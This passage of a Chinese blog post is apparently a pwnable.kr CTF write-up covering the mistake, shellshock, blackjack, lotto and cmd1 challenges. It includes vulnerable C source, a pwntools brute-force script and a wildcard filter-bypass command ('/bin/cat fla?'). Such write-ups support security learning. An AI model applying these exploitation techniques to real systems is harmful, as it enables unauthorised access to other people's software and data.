<span class="keyword">int</span> len;</span><br><span class="line">	<span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input password : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// xor your input</span></span><br><span class="line">	xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序的漏洞在<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个地方程序的优先级出现了问题<br>具体优先级参考下表<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-12下午10.31.16.png" alt><br>所以那个if实际上是先做了判断再赋值，所以fd=0,所以后面的密码实际是我们自己输入了<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200312224027.png" alt></p>
+<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里要介绍一下Linux shellshock漏洞，也就是CVE-2014-6271 中文名：破壳的漏洞<br>先看下env函数的man 手册<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-13下午2.08.20.png" alt><br>env命令就是在运行command的时候将name对应的变量设置成value，也就是在运行一个程序的时候设置好他的环境变量，这个漏洞就出现在name=value的部分<br>漏洞原理：</p>
+<blockquote>
+<p>bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断</p>
+</blockquote>
+<p>也就是说我们本来应该应该给name设置一个value的结果value里的指令被执行了<br>先看看这个题的权限</p>
+<p><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-13下午2.25.36.png" alt><br>字母d 的含义是这是一个目录<br>r w x就是 读，写，执行的权限<br>s 是比较特殊，这个也是Linux的文件特权指令<br>s权限： 设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份. 典型的文件是passwd. 如果一般用户执行该文件, 则在执行过程中, 该文件可以获得root权限, 从而可以更改用户的密码.<br><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al /usr/bin/passwd</span><br><span class="line">-rwsr-xr-x <span class="number">1</span> pythontab pythontab <span class="number">32988</span> <span class="number">2018</span>-<span class="number">0</span>3-<span class="number">16</span> <span class="number">14</span>:<span class="number">25</span> /usr/bin/passwd</span><br></pre></td></tr></table></figure></p>
+<p>所以这个题里面shellshock文件有s权限，所以运行之后就会获得root权限，也就获得了读取flag的权限<br>参考网上CVE-2014-6271的POC：<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200313143841.png" alt><br>这里可能有人会疑惑是先执行env里的语句还是执行后面的shellshock，肯定是先执行sehllshock，在执行这个的过程中再调用env里的语句，最后得到flag</p>
+<h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><p>哇。。。这个题源码怎么这么长。。。。<br>我之前还不知道21点怎么完，看这个源码真的爆炸。。。。 先说下这个规则吧</p>
+<blockquote>
+<p>1.这是玩家和庄家之间的对弈类游戏，使用纸牌0-9，J，Q，K，A 分别代表数字0-9，10，12，13，11。A（Ace）也可以代表数字1。<br>2.初始双方各得到一张牌，双方可以选择 Hit or Stay，Hit 则得到一张牌，Stay则保持不动。<br>3.以21为界限，一旦一方牌面数字之和超过21，则“爆破”，这一方就输了这一局。<br>4.如果双方都Stay切牌面之和不超过21，大的获胜。<br>5.庄家每一局的牌面之和必须大于等于17。<br>6.任意一方一开始的两张牌若为 J 和 A ，就代表 Blackjack，直接获胜。</p>
+</blockquote>
+<p>这个题让赢够100万，靠手玩是不可能赢得，我们又不是卢本伟对吧，所以只能去找源码中的漏洞</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (bet &gt; cash) <span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nYou cannot bet more money than you have."</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);     <span class="comment">//这里居然没有进行重新输入的验证</span></span><br><span class="line">        <span class="keyword">return</span> bet;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">return</span> bet;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br></pre></td></tr></table></figure>
+<p>漏洞点在这个地方，题目只会比较一次输入的赌金合不合法，所以我们如果在这里输入两次，第二次输入100万，那么只要赢一场就可以拿到flag<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-13下午9.06.16.png" alt></p>
+<h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">			match++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>漏洞点在这个地方，双重循环逻辑是错的，只要我们可以满足有一位等于其中的某一位，就可以使match达到6，写好脚本遍历就好<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = process(<span class="string">'./lotto'</span>)</span><br><span class="line">s.recv()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>,<span class="number">0x30</span>):</span><br><span class="line">	s.sendline(<span class="string">'1'</span>)</span><br><span class="line">	s.sendline(chr(i)*<span class="number">6</span>)</span><br><span class="line">	s.recvuntil(<span class="string">'Lotto Start!\n'</span>)</span><br><span class="line">	data = s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"bad"</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">		<span class="keyword">print</span> data</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	s.recvuntil(<span class="string">'Exit\n'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"error"</span></span><br></pre></td></tr></table></figure></p>
+<p>因为题目中可以输入的都是可见字符，所以遍历可见字符就好<br><img src="https://cdn.jsdelivr.net/gh/HackPluto/bokepicture@master/uPic/截屏2020-03-13下午10.18.43.png" alt="截屏2020-03-13下午10.18.43"></p>
+<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">	putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>putenv(“PATH=/thankyouverymuch”); 的作用是不让我们直接去输入命令，只能使用/bin/cat<br>题目对flag等进行了过滤但是我们可以使用通配符绕过<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd1@ubuntu:~$ ./cmd1 <span class="string">"/bin/cat fla?"</span></span><br><span class="line">mommy now I get what PATH environment <span class="keyword">is</span> <span class="keyword">for</span> :)</span><br></pre></td></tr></table></figure></p>
+<p><a href="https://github.com/DoubleLabyrinth/pwnable.kr/tree/master/Toddler&#39;s%20Bottle/cmd1" target="_blank" rel="noopener">https://github.com/DoubleLabyrinth/pwnable.kr/tree/master/Toddler&#39;s%20Bottle/cmd1</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">HackPluto</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2020/03/11/Pwnable.kr详解/">http://yoursite.com/2020/03/11/Pwnable.kr详解/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2020/03/11/Pwnable.kr详解/">March 11th 2020, 4:17:12 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2020/03/11/Pwnable.kr详解/">March 14th 2020, 1:19:59 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2020/03/14/ctfhub_pwn刷题WP/" title>
+                    <div class="nextTitle">[Untitled Post]</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/03/05/SQL词义分析(状态自动机)/" title>
+                    <div class="prevTitle">[Untitled Post]</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:turing0day@gmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/HackPluto" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Toddler’s-Bottle"><span class="toc-number">1.</span> <span class="toc-text">Toddler’s Bottle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fd"><span class="toc-number">1.1.</span> <span class="toc-text">fd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件描述符"><span class="toc-number">1.1.1.</span> <span class="toc-text">文件描述符</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#特点"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">特点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#collision"><span class="toc-number">1.2.</span> <span class="toc-text">collision</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bof"><span class="toc-number">1.3.</span> <span class="toc-text">bof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-number">1.4.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#passcode"><span class="toc-number">1.5.</span> <span class="toc-text">passcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#random"><span class="toc-number">1.6.</span> <span class="toc-text">random</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input"><span class="toc-number">1.7.</span> <span class="toc-text">input</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#argv"><span class="toc-number">1.7.1.</span> <span class="toc-text">argv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stdio"><span class="toc-number">1.7.2.</span> <span class="toc-text">stdio</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#env"><span class="toc-number">1.7.3.</span> <span class="toc-text">env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file"><span class="toc-number">1.7.4.</span> <span class="toc-text">file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#network"><span class="toc-number">1.7.5.</span> <span class="toc-text">network</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leg"><span class="toc-number">1.8.</span> <span class="toc-text">leg</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Thumb"><span class="toc-number">1.8.1.</span> <span class="toc-text">Thumb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mistake"><span class="toc-number">1.9.</span> <span class="toc-text">mistake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellshock"><span class="toc-number">1.10.</span> <span class="toc-text">shellshock</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#blackjack"><span class="toc-number">1.11.</span> <span class="toc-text">blackjack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lotto"><span class="toc-number">1.12.</span> <span class="toc-text">lotto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd1"><span class="toc-number">1.13.</span> <span class="toc-text">cmd1</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 45
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href="/2020/03/15/BUUCTF_pwn_writeup/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href="/2020/03/14/ctfhub_pwn刷题WP/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href="/2020/03/11/Pwnable.kr详解/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2020/03/05/SQL词义分析(状态自动机)/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/Mikrotik Chimay-Red 分析/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2020/03/02/how2heap/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href="/2020/02/09/HITCON Training Writeup/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href="/2020/02/07/pwnxyz/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href="/2020/01/03/PowerPC汇编学习/">PowerPC汇编学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/11</span><a class="archive-post-title" href="/2019/12/11/HITCON-Trainging-lab13/">HITCON Trainging lab13详解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/11</span><a class="archive-post-title" href="/2019/11/11/Linux堆溢出unlink攻击/">Linux堆溢出unlink攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href="/2019/11/06/Linux堆溢出漏洞--off-by-one/">Linux堆溢出漏洞--off-by-one</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href="/2019/11/01/CCProxy栈溢出漏洞分析及利用/">CCProxy栈溢出漏洞分析及利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2019/10/28/DirtyCow漏洞复现及原理分析/">DirtyCow漏洞复现及原理分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2019/10/28/树状数组/">树状数组</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/2019/10/17/堆的分配原理分析/">堆的分配原理分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span><a class="archive-post-title" href="/2019/10/14/ucore-lab0,lab1/">ucore_lab0,lab1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/09</span><a class="archive-post-title" href="/2019/10/09/pwn-堆溢出/">PWN-堆溢出</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href="/2019/09/30/格式化字符串漏洞/">格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/29</span><a class="archive-post-title" href="/2019/09/29/花式栈溢出技巧/">花式栈溢出技巧</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/27</span><a class="archive-post-title" href="/2019/09/27/看雪KCTF2019wp/">看雪KCTF2019wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href="/2019/09/24/反静态调试总结/">反静态调试总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/2019/09/20/msf恶意代码免杀总结/">msf恶意代码免杀总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2019/09/01/windows后渗透维权/">windows后渗透维权</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/14</span><a class="archive-post-title" href="/2019/08/14/基于BROP的栈溢出漏洞利用/">基于BROP的栈溢出漏洞利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span><a class="archive-post-title" href="/2019/08/11/Linux动态链接库之GOT-PLT/">Linux动态链接库之GOT,PLT</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span><a class="archive-post-title" href="/2019/08/09/ACM数论/">ACM数论</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/2019/08/06/Traceme动态分析与静态分析/">Traceme动态分析与静态分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/01</span><a class="archive-post-title" href="/2019/08/01/Pwn-栈溢出与canary/">Pwn--栈溢出与绕过防护</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
